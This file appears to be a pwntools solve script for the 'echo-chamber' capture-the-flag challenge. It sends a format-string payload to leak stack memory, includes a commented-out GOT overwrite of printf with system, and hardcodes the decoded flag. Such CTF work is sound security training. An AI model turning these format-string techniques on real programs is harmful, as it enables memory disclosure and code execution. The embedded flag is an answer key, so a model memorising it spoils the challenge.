#!/usr/bin/env python3

from pwn import *

exe = ELF('echo-chamber', checksec=False)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
context.binary = exe
context.terminal = [ '/mnt/c/Windows/System32/cmd.exe', '/c', 'start', 'wt.exe', '-w', '0', 'split-pane', '--size', '0.6', '-d', '.', 'wsl.exe','-d', 'Parrot', 'bash', '-c' ]

debug = lambda msg: log.debug(msg)
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
error = lambda msg: log.error(msg)
critical = lambda msg: log.critical(msg)
warning = lambda msg: log.warning(msg)

s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE and not args.DOCKER:
        gdb.attach(p, gdbscript='''
        set follow-fork-mode parent
        b*0x0000000000401235


        c
        ''')
        input()

if args.REMOTE:
    p = remote('echo-chamber-72bc6e0bac1f.chall.nnsc.tf',1337, ssl=True)
elif args.DOCKER:
    p = remote('')
else:
    p = process([exe.path])
    
GDB()
payload = f'%{0x10+6}$p %{0x11+6}$p %{0x12+6}$p %{0x13+6}$p %{0x14+6}$p %{0x15+6}$p %{0x16+6}$p %{0x17+6}$p'.encode()
# payload = fmtstr_payload(6, {exe.got.prinf, exe.sym.system})
sla(b'> ', payload)

vals = [
    0x306c5f697b534e4e,
    0x705f5730685f3376,
    0x34375f46374e3152,
    0x5f3368375f73654b,
    0x73615f6b43613735,
    0x6e334d753672345f,
    0xa7d3574,
]

print(b''.join(p64(x) for x in vals))

p.interactive()
